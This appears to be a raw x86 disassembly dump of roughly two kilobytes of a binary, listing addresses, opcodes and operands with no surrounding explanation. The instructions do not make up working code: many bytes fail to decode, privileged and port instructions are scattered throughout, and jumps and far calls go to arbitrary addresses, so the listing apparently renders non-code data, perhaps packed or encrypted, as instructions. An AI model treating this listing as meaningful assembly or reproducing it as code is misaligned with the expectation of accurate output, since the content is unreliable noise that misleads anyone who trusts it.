  4137a2:	psubusw mm3,QWORD PTR ds:0x5dcb7dad
  4137a9:	mov    cl,0x73
  4137ab:	pop    ecx
  4137ac:	or     esi,DWORD PTR [ebx-0x23]
  4137af:	ror    DWORD PTR [esp+eiz*2+0x4c],1
  4137b3:	div    BYTE PTR [eax+0x24]
  4137b6:	not    BYTE PTR [edi]
  4137b8:	mov    ecx,0x1f48028d
  4137bd:	retf   0x295d
  4137c0:	pop    edx
  4137c1:	mov    ah,0xb
  4137c3:	loop   0x413773
  4137c5:	dec    ebp
  4137c6:	xor    BYTE PTR [esi-0x7c],0x2c
  4137ca:	jl     0x41379b
  4137cc:	ss call 0x63c0:0xe8383653
  4137d4:	(bad)  
  4137d5:	lock test bl,0x61
  4137d9:	jae    0x413762
  4137db:	loop   0x41378c
  4137dd:	out    dx,al
  4137de:	loope  0x41379d
  4137e0:	ds cmc 
  4137e2:	xchg   DWORD PTR [esi+0x36],ecx
  4137e5:	push   ss
  4137e6:	cmp    eax,0x9f7f31d9
  4137eb:	pop    esi
  4137ec:	or     al,0x9
  4137ee:	or     al,0x2b
  4137f0:	mov    cl,0x7
  4137f2:	mov    ecx,0xa004dfe2
  4137f7:	es push edx
  4137f9:	pop    es
  4137fa:	ror    BYTE PTR [eax+0x70857c70],1
  413800:	shr    DWORD PTR [esi],1
  413802:	push   ebp
  413803:	xchg   edi,eax
  413804:	sbb    BYTE PTR [eax+eax*8-0x63c6ef50],0x17
  41380c:	cwde   
  41380d:	sbb    dl,BYTE PTR [edx+edx*4]
  413810:	pop    esi
  413811:	xchg   esp,eax
  413812:	mov    ds:0x7e711aa8,eax
  413817:	push   ss
  413818:	les    eax,FWORD PTR [edx-0x4d46178]
  41381e:	and    eax,0x82a9aab2
  413823:	sbb    edi,eax
  413825:	pop    edi
  413826:	pop    edi
  413827:	fld    QWORD PTR [ebx]
  413829:	imul   DWORD PTR [edx+0x46]
  41382c:	adc    al,0x85
  41382e:	mov    ecx,0x12944611
  413833:	mov    ecx,0x6b429713
  413838:	push   edi
  413839:	icebp  
  41383a:	or     eax,0xd706590b
  41383f:	lds    ebx,FWORD PTR [edx]
  413841:	lea    ecx,[ebx+0x24a6cf7b]
  413847:	fisttp WORD PTR [ebp-0x46]
  41384a:	mov    esp,0x9e6b2583
  41384f:	ret    0xffd7
  413852:	dec    ecx
  413853:	shr    BYTE PTR [ebx+0x1d3fd22b],0xfd
  41385a:	(bad)  [edx+ecx*8+0x5b]
  41385e:	ins    BYTE PTR es:[edi],dx
  41385f:	dec    edx
  413860:	pushf  
  413861:	xor    DWORD PTR [edx],edx
  413863:	jnp    0x41383c
  413865:	js     0x4137f3
  413867:	(bad)  
  413868:	lods   al,BYTE PTR ds:[esi]
  413869:	popf   
  41386a:	je     0x4138b4
  41386c:	inc    edx
  41386d:	ror    DWORD PTR [esi-0x41e2d308],0xa9
  413874:	sar    BYTE PTR ds:0xe7d84e2b,1
  41387a:	xchg   ebx,eax
  41387b:	mov    eax,0xb3ad045a
  413880:	xchg   ecx,eax
  413881:	lock push edx
  413883:	and    BYTE PTR [ecx],bh
  413885:	loope  0x41387f
  413887:	int3   
  413888:	inc    edx
  413889:	mov    edi,0xbad5fa84
  41388e:	ss mov dh,0xe3
  413891:	adc    ebx,DWORD PTR [esp+edx*2+0x35]
  413895:	lock push ss
  413897:	xchg   esi,eax
  413898:	iret   
  413899:	clc    
  41389a:	loop   0x413907
  41389c:	int3   
  41389d:	xchg   esi,eax
  41389e:	addr16 lock out dx,eax
  4138a1:	mov    dh,0xab
  4138a3:	dec    ebp
  4138a4:	push   eax
  4138a5:	(bad)  
  4138a6:	mov    ch,0x7
  4138a8:	out    dx,eax
  4138a9:	push   esi
  4138aa:	cmp    BYTE PTR [ebx-0x6c398d40],ch
  4138b0:	mov    edi,0x723a4051
  4138b5:	icebp  
  4138b6:	out    dx,eax
  4138b7:	das    
  4138b8:	sub    ah,0x53
  4138bb:	push   edx
  4138bc:	js     0x41385c
  4138be:	fisubr DWORD PTR [ebx+0x7b134a3f]
  4138c4:	jg     0x4138b5
  4138c6:	cld    
  4138c7:	adc    eax,0x6a6c3d04
  4138cc:	ss pop ebp
  4138ce:	xchg   esi,eax
  4138cf:	xchg   DWORD PTR [eax-0x11],edx
  4138d2:	mov    ebp,0xa4a31039
  4138d7:	adc    al,0xb5
  4138d9:	mov    BYTE PTR [ebx],cl
  4138db:	int3   
  4138dc:	pusha  
  4138dd:	adc    esp,DWORD PTR [eax+0x0]
  4138e0:	arpl   WORD PTR [edx-0x2e],dx
  4138e3:	mov    dh,0x81
  4138e5:	xchg   DWORD PTR [eax],ecx
  4138e7:	ins    BYTE PTR es:[edi],dx
  4138e8:	mov    eax,ds:0x863b361b
  4138ed:	pop    eax
  4138ee:	(bad)  
  4138f0:	jno    0x4138c2
  4138f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138f3:	pop    ebp
  4138f4:	pop    ebx
  4138f5:	push   eax
  4138f6:	adc    al,0xa9
  4138f8:	fistp  WORD PTR [ebx-0x67]
  4138fb:	sub    BYTE PTR ds:0xb4b0a837,dl
  413901:	in     eax,dx
  413902:	xchg   edi,eax
  413903:	and    DWORD PTR ds:[edi-0x13c7c947],edi
  41390a:	jg     0x4138f7
  41390c:	pop    ebx
  41390d:	lods   eax,DWORD PTR ds:[esi]
  41390e:	rcl    DWORD PTR [edx+edx*2-0x45],cl
  413912:	iret   
  413913:	pop    ss
  413914:	dec    edx
  413915:	stc    
  413916:	je     0x4138f8
  413918:	jbe    0x413957
  41391a:	sbb    ebp,DWORD PTR [ebx]
  41391c:	std    
  41391d:	mov    eax,0x27b466e7
  413922:	std    
  413923:	lods   eax,DWORD PTR ds:[esi]
  413924:	push   edi
  413925:	push   ebp
  413926:	xchg   ebp,eax
  413927:	mov    dh,BYTE PTR [edi]
  413929:	mov    ebx,0x396aad63
  41392e:	inc    esp
  41392f:	jnp    0x4139ad
  413931:	and    DWORD PTR [edi],ecx
  413933:	inc    edi
  413934:	and    cl,BYTE PTR [ebx-0x64e22a1f]
  41393a:	mov    eax,ds:0xcff805c6
  41393f:	dec    edi
  413940:	je     0x41391d
  413942:	inc    eax
  413943:	leave  
  413944:	icebp  
  413945:	cmp    DWORD PTR [eax-0x1b0da167],0xffffffa2
  41394c:	cdq    
  41394d:	jp     0x41390c
  41394f:	ins    DWORD PTR es:[edi],dx
  413950:	pop    edi
  413951:	je     0x413966
  413953:	cs sbb al,0xcf
  413956:	mov    al,0x63
  413958:	jno    0x41399d
  41395a:	sub    eax,0x5910f26d
  41395f:	std    
  413960:	or     edi,DWORD PTR [ebx+0x36]
  413963:	(bad)  
  413964:	fcmovbe st,st(3)
  413966:	ins    DWORD PTR es:[edi],dx
  413967:	test   eax,0x561c9261
  41396c:	out    0xb8,eax
  41396e:	xchg   ecx,eax
  41396f:	xor    BYTE PTR [ecx],0x27
  413972:	scas   al,BYTE PTR es:[edi]
  413973:	push   esp
  413974:	jge    0x413904
  413976:	(bad)  
  413978:	mov    eax,0x15934f5b
  41397d:	not    BYTE PTR [eax+0x7a]
  413980:	shl    ecx,0x6b
  413983:	out    0x78,al
  413985:	fstp   TBYTE PTR [ebp+0x10bb89bb]
  41398b:	ja     0x413955
  41398d:	pop    edx
  41398e:	xchg   edx,eax
  41398f:	ins    BYTE PTR es:[edi],dx
  413990:	sbb    BYTE PTR [eax],dh
  413992:	inc    edi
  413993:	xor    DWORD PTR [ecx],edi
  413995:	jns    0x41393b
  413997:	repz fdivp st(7),st
  41399a:	mov    bh,0xd4
  41399c:	cmp    eax,0x909710c0
  4139a1:	out    0xe6,eax
  4139a3:	xor    al,0xc2
  4139a5:	mov    bh,0x30
  4139a7:	adc    eax,0x254f4947
  4139ac:	adc    ecx,ecx
  4139ae:	stc    
  4139af:	hlt    
  4139b0:	das    
  4139b1:	neg    BYTE PTR [edi]
  4139b3:	push   esi
  4139b4:	pop    eax
  4139b5:	pusha  
  4139b6:	ror    BYTE PTR [ebx+0x79],1
  4139b9:	mov    esp,0xe2997334
  4139be:	pop    edi
  4139bf:	pop    edx
  4139c0:	jae    0x413a1f
  4139c2:	sub    BYTE PTR [edi],bh
  4139c4:	imul   ebp,DWORD PTR ds:0xdc473524,0x43398a72
  4139ce:	cmp    cl,BYTE PTR [eax]
  4139d0:	(bad)
  4139d3:	loopne 0x413972
  4139d5:	sar    ebp,cl
  4139d7:	inc    DWORD PTR [edi-0x7ea5da7a]
  4139dd:	push   cs
  4139de:	dec    eax
  4139df:	repnz out 0x61,eax
  4139e2:	dec    ebp
  4139e3:	pushf  
  4139e4:	js     0x413983
  4139e6:	arpl   sp,cx
  4139e8:	sub    al,BYTE PTR [eax+0x349e477d]
  4139ee:	sahf   
  4139ef:	sub    eax,0x42de0320
  4139f4:	imul   eax,DWORD PTR [ebx-0x7a],0xe99fbedb
  4139fb:	or     DWORD PTR [esi+0x79f59c84],ebp
  413a01:	int3   
  413a02:	mov    esi,DWORD PTR [ebx+0x30e74eb1]
  413a08:	int3   
  413a09:	ss aad 0xd0
  413a0c:	xchg   BYTE PTR [ebx],bh
  413a0e:	inc    ebp
  413a0f:	push   ebx
  413a10:	les    ebx,FWORD PTR [esi-0x7ede5bc0]
  413a16:	and    eax,0x1bf950f8
  413a1b:	idiv   DWORD PTR [edi]
  413a1d:	pmaddwd mm1,QWORD PTR [ebx+0x3672cc28]
  413a24:	out    dx,al
  413a25:	cwde   
  413a26:	or     eax,0xc3716109
  413a2b:	jbe    0x413a9f
  413a2d:	adc    dh,0x41
  413a30:	addr16 pop esp
  413a32:	cmp    BYTE PTR ds:0xee5480d4,cl
  413a38:	loop   0x413a09
  413a3a:	adc    al,BYTE PTR [ecx]
  413a3c:	xlat   BYTE PTR ds:[ebx]
  413a3d:	fidivr WORD PTR [eax-0x5d05a13a]
  413a43:	into   
  413a44:	inc    ebx
  413a45:	call   0x5f35c884
  413a4a:	inc    esi
  413a4b:	stc    
  413a4c:	cdq    
  413a4d:	pop    esi
  413a4e:	pop    es
  413a4f:	pop    ds
  413a50:	or     bl,bl
  413a52:	adc    eax,0xc58b7a6e
  413a57:	push   edx
  413a59:	xlat   BYTE PTR ds:[ebx]
  413a5a:	dec    ebx
  413a5b:	jl     0x413a5a
  413a5d:	mov    al,0xfc
  413a5f:	scas   al,BYTE PTR es:[edi]
  413a60:	fsubr  QWORD PTR [edx-0x62206399]
  413a66:	push   eax
  413a67:	and    BYTE PTR [ebx-0x693a7e6e],al
  413a6d:	jp     0x413ae9
  413a6f:	sbb    eax,DWORD PTR [ecx]
  413a71:	div    BYTE PTR [edi+0x34ce19ad]
  413a77:	xchg   ebp,eax
  413a78:	add    eax,0xe5209c7e
  413a7d:	gs nop
  413a7f:	cld    
  413a80:	push   0x67
  413a82:	into   
  413a83:	sti    
  413a84:	cmp    BYTE PTR [ecx+edx*1+0x9e113b],bl
  413a8b:	mov    esi,0xf1d9fa84
  413a90:	dec    eax
  413a91:	popa   
  413a92:	into   
  413a93:	clc    
  413a94:	lds    edi,FWORD PTR [esi]
  413a96:	cmp    dl,BYTE PTR [esi-0x1a]
  413a99:	sbb    al,0x6
  413a9b:	push   cs
  413a9c:	test   BYTE PTR [ecx],al
  413a9e:	fcomp  QWORD PTR [ecx-0x76]
  413aa1:	ret    
  413aa2:	xor    dl,BYTE PTR [eax-0x992b4fe]
  413aa8:	jb     0x413a55
  413aaa:	scas   eax,DWORD PTR es:[edi]
  413aab:	dec    ecx
  413aac:	cmp    al,0x7d
  413aae:	sub    BYTE PTR [ecx*1+0x52e07e9b],dl
  413ab5:	xchg   edi,eax
  413ab6:	add    ecx,DWORD PTR [ebp+0x5165191a]
  413abc:	rcr    BYTE PTR [bx+si-0x56],0x41
  413ac1:	(bad)  
  413ac2:	cmc    
  413ac3:	sahf   
  413ac4:	pushf  
  413ac5:	mov    DWORD PTR [edx],esi
  413ac7:	jne    0x413ae2
  413ac9:	fmul   DWORD PTR [edx-0x12]
  413acc:	in     al,0x55
  413ace:	call   0xc1d2:0x7f19d32c
  413ad5:	cli    
  413ad6:	daa    
  413ad7:	sub    al,0xca
  413ad9:	sbb    eax,0x7e22765f
  413ade:	(bad)  
  413adf:	push   ebp
  413ae0:	sti    
  413ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae2:	sahf   
  413ae3:	stc    
  413ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ae5:	not    dl
  413ae7:	(bad)  
  413ae8:	pop    esi
  413ae9:	xlat   BYTE PTR ds:[ebx]
  413aea:	daa    
  413aeb:	pop    eax
  413aec:	cld    
  413aed:	(bad)  
  413aee:	mul    DWORD PTR [ecx-0x73cd030b]
  413af4:	sub    eax,edx
  413af6:	lds    edi,FWORD PTR [edi-0x658f4705]
  413afc:	call   0xfc02:0x36ccdd67
  413b03:	test   DWORD PTR [edi],edi
  413b05:	push   ebx
  413b06:	inc    ebp
  413b07:	cmp    BYTE PTR [edi],bl
  413b09:	push   esp
  413b0a:	adc    dh,0x67
  413b0d:	bound  eax,QWORD PTR [eax]
  413b0f:	shl    BYTE PTR [ebp-0x13586f20],0xe
  413b16:	mov    ch,0xf8
  413b18:	fwait
  413b19:	xchg   edi,eax
  413b1a:	inc    ecx
  413b1b:	and    eax,0x9a5ff06e
  413b20:	adc    eax,0x43bc0b92
  413b25:	add    al,0x1d
  413b27:	add    BYTE PTR [ebp+0x4f3d0150],bl
  413b2d:	cli    
  413b2e:	inc    edx
  413b2f:	shr    DWORD PTR [esi+0x71],cl
  413b32:	adc    al,0x5b
  413b34:	stos   BYTE PTR es:[edi],al
  413b35:	mov    cl,al
  413b37:	(bad)  
  413b38:	iret   
  413b39:	gs std 
  413b3b:	push   esi
  413b3c:	les    ecx,FWORD PTR [ebx+0x5d]
  413b3f:	hlt    
  413b40:	dec    esp
  413b41:	adc    DWORD PTR [ebx],ebx
  413b43:	or     esp,esi
  413b45:	jae    0x413b23
  413b47:	dec    ebp
  413b48:	jg     0x413b21
  413b4a:	sbb    al,0x8c
  413b4c:	sbb    DWORD PTR [edx+0x39],ebp
  413b4f:	cdq    
  413b50:	bound  ebp,QWORD PTR [edx-0x6de3e20f]
  413b56:	stos   BYTE PTR es:[edi],al
  413b57:	inc    edi
  413b58:	or     BYTE PTR [edx-0x5],0xc7
  413b5c:	pop    esp
  413b5d:	je     0x413b29
  413b5f:	out    dx,eax
  413b60:	fld    DWORD PTR [ebx+0x7d]
  413b63:	jo     0x413b2e
  413b65:	(bad)  
  413b66:	xor    DWORD PTR [eax-0x69],edx
  413b69:	outs   dx,DWORD PTR cs:[esi]
  413b6b:	lods   eax,DWORD PTR ds:[esi]
  413b6c:	jae    0x413b9d
  413b6e:	dec    ecx
  413b6f:	mov    ecx,DWORD PTR [ecx+ebx*8-0x4f68128]
  413b76:	(bad)  
  413b77:	pop    eax
  413b78:	in     eax,0x29
  413b7a:	push   edx
  413b7b:	sub    esi,ebx
  413b7d:	cmp    DWORD PTR [edi],ebx
  413b7f:	sti    
  413b80:	cmp    DWORD PTR ds:0x26e943a9,eax
  413b86:	stos   BYTE PTR es:[edi],al
  413b87:	enter  0x553d,0x9
  413b8b:	call   0x4f77:0xd1b4918d
  413b92:	cmc    
  413b93:	mov    cl,0xde
  413b96:	stos   DWORD PTR es:[edi],eax
  413b97:	fidivr WORD PTR [edx*1-0x3db74939]
  413b9e:	push   ecx
  413b9f:	mov    ds:0x4f800112,eax
  413ba4:	arpl   WORD PTR [eax-0x4d9caff3],cx
  413baa:	pop    ebx
  413bab:	lods   al,BYTE PTR ds:[esi]
  413bac:	xor    BYTE PTR [edx],bh
  413bae:	jne    0x413c2d
  413bb0:	sub    BYTE PTR [esp+eiz*4],bh
  413bb3:	push   ebp
  413bb4:	dec    ebx
  413bb5:	ja     0x413b93
  413bb7:	xor    al,0x92
  413bb9:	cmp    eax,DWORD PTR [ebp+ebx*4-0x49c2d57]
  413bc0:	jo     0x413c1f
  413bc2:	loopne 0x413b6e
  413bc4:	dec    edi
  413bc5:	dec    ebp
  413bc6:	or     ebp,DWORD PTR [edi]
  413bc8:	mov    al,ds:0xb9319218
  413bcd:	mov    ds:0x390b9a12,eax
  413bd2:	inc    esi
  413bd3:	sub    BYTE PTR [edx],bl
  413bd5:	adc    ax,0x9e3a
  413bd9:	and    dh,dh
  413bdb:	loope  0x413bbb
  413bdd:	mov    edx,0xe0f74647
  413be2:	xchg   ebp,eax
  413be3:	pusha  
  413be4:	dec    esp
  413be5:	fucomi st,st(5)
  413be7:	das    
  413be8:	or     DWORD PTR ds:0xad9bd9f9,edx
  413bee:	test   DWORD PTR [edi+eax*8],0xa2bd73b
  413bf5:	adc    bl,BYTE PTR [edx+0x54]
  413bf8:	push   esp
  413bf9:	jns    0x413c47
  413bfb:	sbb    DWORD PTR [ebx-0x6a5e96c1],ebp
  413c01:	cpuid  
  413c03:	iret   
  413c04:	or     eax,0xc59859ff
  413c09:	mov    bl,0xf5
  413c0b:	sbb    cl,BYTE PTR [esi]
  413c0d:	xor    edi,DWORD PTR [ecx+eax*2]
  413c10:	imul   ebp,ebp,0xffffff80
  413c13:	ret    0x6f45
  413c16:	dec    eax
  413c17:	shl    cl,0x1e
  413c1a:	bound  edi,QWORD PTR [edx]
  413c1c:	adc    dh,BYTE PTR [eax+0x4a7c8f9f]
  413c22:	pop    ecx
  413c23:	inc    esp
  413c24:	rol    BYTE PTR [esi],0x5e
  413c27:	adc    BYTE PTR [edx],0xd8
  413c2a:	enter  0xaba2,0xac
  413c2e:	and    ebx,DWORD PTR [ecx-0x61f4a12d]
  413c34:	add    DWORD PTR cs:[edx],eax
  413c37:	mov    cl,0xdd
  413c39:	out    0x16,al
  413c3b:	xor    DWORD PTR [ebp-0x24],edi
  413c3e:	adc    eax,0x6ebaf9cf
  413c43:	mov    gs,esi
  413c45:	inc    ebx
  413c46:	dec    esp
  413c47:	test   BYTE PTR [ebx+0x68],0x29
  413c4b:	popa   
  413c4c:	outs   dx,DWORD PTR ds:[esi]
  413c4d:	mov    dh,0x1
  413c4f:	add    bl,ch
  413c51:	int    0x41
  413c53:	out    0x1b,al
  413c55:	push   ecx
  413c56:	xchg   ebx,eax
  413c57:	fwait
  413c58:	xor    BYTE PTR [ebx-0x1d],0x7c
  413c5c:	repz retf 0x4f37
  413c60:	add    ecx,eax
  413c62:	(bad)  
  413c63:	(bad)  
  413c64:	int3   
  413c65:	push   ss
  413c66:	lods   al,BYTE PTR ds:[esi]
  413c67:	mov    edi,0xf70f6d0c
  413c6c:	mov    cl,0xa2
  413c6e:	imul   BYTE PTR [ecx+0x714d7395]
  413c74:	or     eax,DWORD PTR [ebx+0x6e]
  413c77:	loopne 0x413c28
  413c79:	sti    
  413c7a:	mov    dl,0xbf
  413c7c:	fwait
  413c7d:	sahf   
  413c7e:	or     ebp,DWORD PTR [ecx-0x7d]
  413c81:	jl     0x413cf8
  413c83:	cli    
  413c84:	inc    ecx
  413c85:	cmc    
  413c86:	aad    0x11
  413c88:	pusha  
  413c89:	pop    ecx
  413c8a:	add    al,0xac
  413c8c:	bound  edx,QWORD PTR [esi-0x1a712af4]
  413c92:	out    dx,al
  413c93:	retf   0x6b9c
  413c96:	sbb    al,0xd9
  413c98:	inc    ebx
  413c99:	pop    edi
  413c9a:	cmp    edi,DWORD PTR [edx-0x44]
  413c9d:	rcr    BYTE PTR [ebp+0x25],cl
  413ca0:	std    
  413ca1:	pop    ebp
  413ca2:	and    edx,DWORD PTR [esi]
  413ca4:	adc    esi,esp
  413ca6:	int    0xee
  413ca8:	sub    eax,0x7cf9a403
  413cad:	mov    ch,0xe4
  413caf:	pop    ebx
  413cb0:	dec    edi
  413cb1:	lods   al,BYTE PTR ds:[esi]
  413cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb3:	jnp    0x413c9f
  413cb5:	jns    0x413ca3
  413cb7:	jns    0x413c4f
  413cb9:	xchg   ecx,eax
  413cba:	sahf   
  413cbb:	xlat   BYTE PTR ds:[ebx]
  413cbc:	mov    fs:0x609e6a5b,al
  413cc2:	push   ecx
  413cc3:	or     eax,0xde8081ba
  413cc8:	fbstp  TBYTE PTR [eax]
  413cca:	cs aam 0x1
  413ccd:	sub    BYTE PTR [ebx+0x7edd53d8],bh
  413cd3:	(bad)  
  413cd4:	cmp    al,0xe1
  413cd6:	dec    eax
  413cd7:	clc    
  413cd8:	dec    BYTE PTR [edi+edx*4]
  413cdb:	jns    0x413d10
  413cdd:	and    BYTE PTR [ecx+0x54],bh
  413ce0:	pop    eax
  413ce1:	sub    eax,0xe07998a0
  413ce6:	test   DWORD PTR [ebx-0x26],ebx
  413ce9:	and    DWORD PTR [eax],edi
  413ceb:	sbb    BYTE PTR [edx-0x200dd49e],cl
  413cf1:	sub    DWORD PTR [ecx-0x39cdf9e8],ebp
  413cf7:	fcmovb st,st(3)
  413cf9:	out    dx,eax
  413cfa:	push   cs
  413cfb:	pop    edx
  413cfc:	inc    eax
  413cfd:	cmp    DWORD PTR [ebx-0x7429d91d],eax
  413d03:	gs jecxz 0x413d3a
  413d06:	retf   0x5a87
  413d09:	push   ds
  413d0a:	in     al,0x97
  413d0c:	outs   dx,DWORD PTR ds:[esi]
  413d0d:	or     eax,0x22f060fc
  413d12:	and    esi,DWORD PTR [ecx+0x13]
  413d15:	xlat   BYTE PTR ds:[ebx]
  413d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d17:	dec    esp
  413d18:	pushf  
  413d19:	push   0x22bbc136
  413d1e:	outs   dx,DWORD PTR ds:[esi]
  413d1f:	mov    ah,0xb9
  413d21:	fistp  DWORD PTR ds:0xfb13f3a
  413d27:	push   cs
  413d28:	mov    ebx,0xa692b92a
  413d2d:	xchg   edi,eax
  413d2e:	push   edi
  413d2f:	iret   
  413d30:	lea    ebx,[ecx]
  413d32:	mov    al,0x2a
  413d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d35:	xor    BYTE PTR [esi],bh
  413d37:	pop    ds
  413d38:	fcom   DWORD PTR [edx]
  413d3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d3b:	lods   al,BYTE PTR ds:[esi]
  413d3c:	or     esp,DWORD PTR [ecx-0x25]
  413d3f:	inc    ebx
  413d40:	dec    ecx
  413d41:	jmp    0x81caa7a2
  413d46:	call   0xb37dc14
  413d4b:	jns    0x413d47
  413d4d:	scas   al,BYTE PTR es:[edi]
  413d4e:	mov    BYTE PTR [eax],bh
  413d50:	iret   
  413d51:	ins    BYTE PTR es:[edi],dx
  413d52:	jnp    0x413dc0
  413d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d55:	dec    eax
  413d56:	(bad)  
  413d57:	push   ecx
  413d58:	cwde   
  413d59:	sbb    ebp,DWORD PTR [esi-0xa]
  413d5c:	ins    DWORD PTR es:[edi],dx
  413d5d:	ret    0x35db
  413d60:	mov    edi,0xc3c74223
  413d65:	fld    DWORD PTR [edx+0x6e09ffb3]
  413d6b:	test   eax,0x8f650e2e
  413d70:	enter  0x2040,0x7b
  413d74:	(bad)  
  413d75:	popa   
  413d76:	data16 (bad) 
  413d78:	int3   
  413d79:	cmp    eax,0xc6636b19
  413d7e:	call   0x18b8e67b
  413d83:	std    
  413d84:	mov    dl,0xf8
  413d86:	mov    esi,0xe301106b
  413d8b:	pop    ds
  413d8c:	jecxz  0x413d79
  413d8e:	sar    BYTE PTR [edx-0x367f759],0xa2
  413d95:	sub    eax,0xe1ae8336
  413d9a:	aas    
  413d9b:	sbb    dl,dl
  413d9d:	dec    esp
  413d9e:	and    eax,0x5649fcc4
  413da3:	pop    ds
  413da4:	xor    ebx,DWORD PTR ds:0x13b0f162
  413daa:	mov    edx,0x13d9cb0f
  413daf:	xchg   esp,eax
  413db0:	gs cmp al,0x77
  413db3:	repnz sub DWORD PTR [ebx],ebx
  413db6:	cmp    ch,bh
  413db8:	cmp    ebx,DWORD PTR [esi]
  413dba:	and    dh,BYTE PTR [edi]
  413dbc:	jle    0x413d79
  413dbe:	shr    DWORD PTR [ebx],1
  413dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc1:	add    esp,DWORD PTR [edi-0x6a]
  413dc4:	les    esi,FWORD PTR [ecx-0x1]
  413dc7:	cwde   
  413dc8:	jb     0x413dc4
  413dca:	jae    0x413da4
  413dcc:	int    0xd5
  413dce:	(bad)
  413dd1:	inc    edi
  413dd2:	or     ebx,ebp
  413dd4:	xor    eax,DWORD PTR [esi+0x54]
  413dd7:	les    edx,FWORD PTR [ecx-0x63]
  413dda:	pop    edi
  413ddb:	jmp    FWORD PTR [eax]
  413ddd:	gs cmp eax,0x65e9faf3
  413de3:	pop    ecx
  413de4:	pop    es
  413de5:	ds aam 0x14
  413de8:	in     al,0xd9
  413dea:	aad    0x38
  413dec:	jb     0x413e14
  413dee:	shl    BYTE PTR [eiz*8-0x1d9c2ac2],cl
  413df5:	imul   ebp,DWORD PTR [ecx-0x65],0xffffffe9
  413df9:	icebp  
  413dfa:	lock sbb al,0x1e
  413dfd:	stos   BYTE PTR es:[edi],al
  413dfe:	mov    edx,0xf475a4cf
  413e03:	into   
  413e04:	pusha  
  413e05:	ficom  WORD PTR [edi-0x3c26e6b9]
  413e0b:	push   0xa0b094d9
  413e10:	jne    0x413de1
  413e12:	jle    0x413d9a
  413e14:	sbb    al,0xf6
  413e16:	push   0x7da9f0e2
  413e1b:	jbe    0x413e35
  413e1d:	in     eax,0xad
  413e1f:	fidiv  DWORD PTR [edi-0x5ccd3e37]
  413e25:	push   0xae5d120a
  413e2a:	mov    ch,0xa2
  413e2c:	fwait
  413e2d:	sbb    al,cl
  413e2f:	repz mov ebp,0x1786c9b7
  413e35:	pop    esi
  413e36:	dec    ebp
  413e37:	cmp    ebp,DWORD PTR [esi+0x79]
  413e3a:	push   edi
  413e3b:	cmp    BYTE PTR [edi+0x2d],ch
  413e3e:	sub    al,0xff
  413e40:	stos   DWORD PTR es:[edi],eax
  413e41:	inc    eax
  413e42:	ror    DWORD PTR [eax],0xaf
  413e45:	jmp    0x413df4
  413e47:	retf   0x1c65
  413e4a:	sbb    BYTE PTR [ebx],bl
  413e4c:	mov    edx,0xc6690b92
  413e51:	sbb    al,0xe4
  413e53:	or     eax,0x547f4f8a
  413e58:	das    
  413e59:	jge    0x413ded
  413e5b:	arpl   WORD PTR [esi],bx
  413e5d:	sub    al,BYTE PTR [ebp+0x42]
  413e60:	inc    edx
  413e61:	sbb    eax,0x3640fe09
  413e66:	adc    cl,BYTE PTR [eax-0x3a]
  413e69:	loopne 0x413e13
  413e6b:	xchg   esp,eax
  413e6c:	mov    cl,0xe4
  413e6e:	lods   al,BYTE PTR ds:[esi]
  413e6f:	fwait
  413e70:	jne    0x413e53
  413e72:	fcmovnu st,st(2)
  413e74:	mov    ah,0x98
  413e76:	fwait
  413e77:	push   ecx
  413e78:	sahf   
  413e79:	or     edi,DWORD PTR [edx-0x5079282f]
  413e7f:	mov    gs,eax
  413e81:	push   edi
  413e82:	sub    BYTE PTR [ecx-0x5e],al
  413e85:	adc    eax,0x17636f0c
  413e8a:	sar    ebx,0x8f
  413e8d:	cmp    dh,BYTE PTR [edx+0x6d]
  413e90:	jmp    0x5920:0xdffd60b9
  413e97:	in     eax,0xf1
  413e99:	adc    dh,0x18
  413e9c:	std    
  413e9d:	pop    ds
  413e9e:	(bad)  
  413e9f:	mov    ds:0xa48e3f42,eax
  413ea4:	pop    edx
  413ea5:	push   cs
  413ea6:	cmc    
  413ea7:	dec    ecx
  413ea8:	or     eax,0x7d887641
  413ead:	jb     0x413e99
  413eaf:	outs   dx,BYTE PTR ds:[esi]
  413eb0:	popa   
  413eb1:	add    al,0x59
  413eb3:	(bad)  
  413eb4:	jo     0x413eba
  413eb6:	dec    edi
  413eb7:	sbb    DWORD PTR [edx],0x94e9daac
  413ebd:	sub    ah,BYTE PTR [eax+eax*8+0x20]
  413ec1:	fdivrp st(5),st
  413ec3:	xchg   ecx,eax
  413ec4:	mov    esp,0x74c8cf7
  413ec9:	retf   
  413eca:	push   esp
  413ecb:	push   0x56
  413ecd:	mov    edx,0xf47eb3bd
  413ed2:	mov    DWORD PTR [eax-0x2245022e],0x66f67b0a
  413edc:	cld    
  413edd:	scas   eax,DWORD PTR es:[edi]
  413ede:	ins    BYTE PTR es:[edi],dx
  413edf:	int3   
  413ee0:	push   eax
  413ee1:	cmp    dh,0xf6
  413ee4:	(bad)  
  413ee5:	aaa    
  413ee6:	pop    DWORD PTR [ebx-0x20]
  413ee9:	dec    ebp
  413eea:	inc    ebp
  413eeb:	push   es
  413eec:	inc    edx
  413eed:	cmp    BYTE PTR [ecx+edi*1+0x16c2bc25],bh
  413ef4:	pop    ds
  413ef5:	jge    0x413f64
  413ef7:	jp     0x413ec9
  413ef9:	or     DWORD PTR [edi],edi
  413efb:	mov    ds:0xb939045b,eax
  413f00:	js     0x413f62
  413f02:	jg     0x413f3f
  413f04:	inc    edx
  413f05:	dec    esi
  413f06:	ins    BYTE PTR es:[edi],dx
  413f07:	pop    ecx
  413f08:	loopne 0x413f16
  413f0a:	rol    DWORD PTR [edi+0xd],1
  413f0d:	xor    eax,0xf8baf9fe
  413f12:	dec    ebp
  413f13:	push   ebp
  413f14:	and    DWORD PTR [ebx+ecx*2],0x57
  413f18:	adc    BYTE PTR [edx+0x4e5b8b1d],ch
  413f1e:	stos   BYTE PTR es:[edi],al
  413f1f:	xchg   ecx,eax
  413f20:	xchg   edx,eax
  413f21:	dec    esp
  413f22:	mov    ebp,DWORD PTR [ecx+0x4708f667]
  413f28:	clc    
  413f29:	es mov esi,0x914aaa
